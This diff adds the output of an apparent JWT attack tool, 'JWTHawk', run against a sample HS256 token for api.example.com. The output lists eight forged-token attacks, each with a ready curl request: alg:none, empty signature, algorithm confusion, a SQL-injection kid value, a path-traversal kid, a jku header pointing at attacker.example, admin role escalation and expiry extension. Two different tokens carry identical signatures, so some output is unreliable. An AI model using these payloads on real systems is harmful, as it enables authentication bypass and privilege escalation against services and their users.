@@ -1,0 +1,192 @@
+# python3 jwthawk.py --token <HS256 sample> --target-curl "curl -H 'Authorization: Bearer {TOKEN}' https://api.example.com/me"
+
+JWTHawk  158-byte token, HS256 baseline
+  baseline header  {"alg": "HS256", "typ": "JWT", "kid": "k1"}
+  baseline payload {"sub": "alice", "role": "user", "exp": 1900000000}
+  signature        32 bytes (64281EDA4ACE1ECD...)
+  target curl      curl -H 'Authorization: Bearer {TOKEN}' https://api.example.com/me
+······································································
+
+attack: alg:none
+why:    server treats `none` as a valid algorithm and skips signature verification
+
+--- header (original)
++++ header (mutated)
+- alg: "HS256"
++ alg: "none"
+  kid: "k1"
+  typ: "JWT"
+
+--- payload (original)
++++ payload (mutated)
+  exp: 1900000000
+  role: "user"
+  sub: "alice"
+
+  note: signature stripped to empty string
+
+  token: eyJhbGciOiJub25lIiwidHlwIjoiSldUIiwia2lkIjoiazEifQ.eyJzdWIiOiJhbGljZSIsInJvbGUiOiJ1c2VyIiwiZXhwIjoxOTAwMDAwMDAwfQ.
+  curl:  curl -H 'Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIiwia2lkIjoiazEifQ.eyJzdWIiOiJhbGljZSIsInJvbGUiOiJ1c2VyIiwiZXhwIjoxOTAwMDAwMDAwfQ.' https://api.example.com/me
+······································································
+
+attack: empty signature
+why:    some libraries accept an empty `b64()` signature when `alg` is unchanged
+
+--- header (original)
++++ header (mutated)
+  alg: "HS256"
+  kid: "k1"
+  typ: "JWT"
+
+--- payload (original)
++++ payload (mutated)
+  exp: 1900000000
+  role: "user"
+  sub: "alice"
+
+  note: alg untouched, signature emptied
+
+  token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6ImsxIn0.eyJzdWIiOiJhbGljZSIsInJvbGUiOiJ1c2VyIiwiZXhwIjoxOTAwMDAwMDAwfQ.
+  curl:  curl -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6ImsxIn0.eyJzdWIiOiJhbGljZSIsInJvbGUiOiJ1c2VyIiwiZXhwIjoxOTAwMDAwMDAwfQ.' https://api.example.com/me
+······································································
+
+attack: alg confusion (RS256 → HS256)
+why:    server uses the RSA public key as an HMAC secret when alg is downgraded to HS256
+
+--- header (original)
++++ header (mutated)
+  alg: "HS256"
+  kid: "k1"
+  typ: "JWT"
+
+--- payload (original)
++++ payload (mutated)
+  exp: 1900000000
+  role: "user"
+  sub: "alice"
+
+  note: WARN: --pubkey not supplied; signed with empty key as a placeholder
+
+  token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6ImsxIn0.eyJzdWIiOiJhbGljZSIsInJvbGUiOiJ1c2VyIiwiZXhwIjoxOTAwMDAwMDAwfQ.crciQPgc3gO3chHYhOQuM22bndBFtqEOeO9xO1PZiqg
+  curl:  curl -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6ImsxIn0.eyJzdWIiOiJhbGljZSIsInJvbGUiOiJ1c2VyIiwiZXhwIjoxOTAwMDAwMDAwfQ.crciQPgc3gO3chHYhOQuM22bndBFtqEOeO9xO1PZiqg' https://api.example.com/me
+······································································
+
+attack: kid SQL injection
+why:    server resolves `kid` via SQL: UNION returns an attacker-controlled key the token is then signed with
+
+--- header (original)
++++ header (mutated)
+  alg: "HS256"
+- kid: "k1"
++ kid: "x' UNION SELECT 'AAAAAAAAAAAAAAAAAAAAAAAAAAA='-- "
+  typ: "JWT"
+
+--- payload (original)
++++ payload (mutated)
+  exp: 1900000000
+  role: "user"
+  sub: "alice"
+
+  note: kid is a UNION SELECT returning the constant 'AAAAAAAAAAAAAAAAAAAAAAAAAAA='
+  note: token signed with that constant via HS256
+
+  token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6IngnIFVOSU9OIFNFTEVDVCAnQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBPSctLSAifQ.eyJzdWIiOiJhbGljZSIsInJvbGUiOiJ1c2VyIiwiZXhwIjoxOTAwMDAwMDAwfQ.cDzRxCSIDS_oHTwYJZawxoy2VRuZAQvgSXEx-GYOYYc
+  curl:  curl -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6IngnIFVOSU9OIFNFTEVDVCAnQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBPSctLSAifQ.eyJzdWIiOiJhbGljZSIsInJvbGUiOiJ1c2VyIiwiZXhwIjoxOTAwMDAwMDAwfQ.cDzRxCSIDS_oHTwYJZawxoy2VRuZAQvgSXEx-GYOYYc' https://api.example.com/me
+······································································
+
+attack: kid path traversal
+why:    server reads the key file from disk via `kid`; pointing at /dev/null yields an empty key
+
+--- header (original)
++++ header (mutated)
+  alg: "HS256"
+- kid: "k1"
++ kid: "../../../../../../dev/null"
+  typ: "JWT"
+
+--- payload (original)
++++ payload (mutated)
+  exp: 1900000000
+  role: "user"
+  sub: "alice"
+
+  note: kid points at /dev/null; HMAC signed with empty key
+
+  token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6Ii4uLy4uLy4uLy4uLy4uLy4uL2Rldi9udWxsIn0.eyJzdWIiOiJhbGljZSIsInJvbGUiOiJ1c2VyIiwiZXhwIjoxOTAwMDAwMDAwfQ.4tPG2Xk_nTOh9HSuUdTnvCcu03jTBgImJzY7a8bSxPQ
+  curl:  curl -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6Ii4uLy4uLy4uLy4uLy4uLy4uL2Rldi9udWxsIn0.eyJzdWIiOiJhbGljZSIsInJvbGUiOiJ1c2VyIiwiZXhwIjoxOTAwMDAwMDAwfQ.4tPG2Xk_nTOh9HSuUdTnvCcu03jTBgImJzY7a8bSxPQ' https://api.example.com/me
+······································································
+
+attack: jku injection
+why:    server fetches the JWKS from the URL in `jku` — point it at an attacker host serving the matching public key
+
+--- header (original)
++++ header (mutated)
+- alg: "HS256"
++ alg: "RS256"
++ jku: "https://attacker.example/.well-known/jwks.json"
+  kid: "k1"
+  typ: "JWT"
+
+--- payload (original)
++++ payload (mutated)
+  exp: 1900000000
+  role: "user"
+  sub: "alice"
+
+  note: jku set to https://attacker.example/.well-known/jwks.json
+  note: host an RSA JWKS at that URL; sign the token with your matching private key (openssl genrsa)
+  note: signature placeholder above is intentional — replace before sending
+
+  token: eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6ImsxIiwiamt1IjoiaHR0cHM6Ly9hdHRhY2tlci5leGFtcGxlLy53ZWxsLWtub3duL2p3a3MuanNvbiJ9.eyJzdWIiOiJhbGljZSIsInJvbGUiOiJ1c2VyIiwiZXhwIjoxOTAwMDAwMDAwfQ.PHNpZ24td2l0aC15b3VyLXByaXZhdGUta2V5Pg
+  curl:  curl -H 'Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6ImsxIiwiamt1IjoiaHR0cHM6Ly9hdHRhY2tlci5leGFtcGxlLy53ZWxsLWtub3duL2p3a3MuanNvbiJ9.eyJzdWIiOiJhbGljZSIsInJvbGUiOiJ1c2VyIiwiZXhwIjoxOTAwMDAwMDAwfQ.PHNpZ24td2l0aC15b3VyLXByaXZhdGUta2V5Pg' https://api.example.com/me
+······································································
+
+attack: role escalation (payload mutation)
+why:    payload-only mutation that pairs with any signature-bypass attack above
+
+--- header (original)
++++ header (mutated)
+  alg: "HS256"
+  kid: "k1"
+  typ: "JWT"
+
+--- payload (original)
++++ payload (mutated)
+  exp: 1900000000
++ is_admin: true
++ is_staff: true
+- role: "user"
++ role: "admin"
++ scope: "admin"
+  sub: "alice"
+
+  note: set role=admin (was 'user')
+  note: added is_admin=True
+  note: added is_staff=True
+  note: added scope=admin
+
+  token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6ImsxIn0.eyJzdWIiOiJhbGljZSIsInJvbGUiOiJhZG1pbiIsImV4cCI6MTkwMDAwMDAwMCwiaXNfYWRtaW4iOnRydWUsImlzX3N0YWZmIjp0cnVlLCJzY29wZSI6ImFkbWluIn0.ZCge2krOHs2E19aaW0ymsW_lMVPm9j2CWUIEea6CN54
+  curl:  curl -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6ImsxIn0.eyJzdWIiOiJhbGljZSIsInJvbGUiOiJhZG1pbiIsImV4cCI6MTkwMDAwMDAwMCwiaXNfYWRtaW4iOnRydWUsImlzX3N0YWZmIjp0cnVlLCJzY29wZSI6ImFkbWluIn0.ZCge2krOHs2E19aaW0ymsW_lMVPm9j2CWUIEea6CN54' https://api.example.com/me
+······································································
+
+attack: exp extension
+why:    extends token validity past sane bounds; pairs with sig-bypass attacks
+
+--- header (original)
++++ header (mutated)
+  alg: "HS256"
+  kid: "k1"
+  typ: "JWT"
+
+--- payload (original)
++++ payload (mutated)
+- exp: 1900000000
++ exp: 9999999999
+  role: "user"
+  sub: "alice"
+
+  note: exp set to 9999999999 (was 1900000000)
+
+  token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6ImsxIn0.eyJzdWIiOiJhbGljZSIsInJvbGUiOiJ1c2VyIiwiZXhwIjo5OTk5OTk5OTk5fQ.ZCge2krOHs2E19aaW0ymsW_lMVPm9j2CWUIEea6CN54
+  curl:  curl -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6ImsxIn0.eyJzdWIiOiJhbGljZSIsInJvbGUiOiJ1c2VyIiwiZXhwIjo5OTk5OTk5OTk5fQ.ZCge2krOHs2E19aaW0ymsW_lMVPm9j2CWUIEea6CN54' https://api.example.com/me
+······································································
